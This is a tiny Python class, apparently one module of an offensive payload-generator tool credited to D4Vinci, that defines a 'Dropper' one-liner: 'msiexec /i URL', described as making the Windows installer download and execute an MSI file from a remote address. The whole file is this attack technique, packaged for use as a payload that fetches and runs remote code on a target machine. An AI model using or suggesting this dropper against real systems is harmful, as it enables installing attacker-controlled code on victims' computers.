class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Passing msi file url to the Windows installer will download and execute it!"
    function    = "Dropper"
    liner     = """msiexec /i URL"""
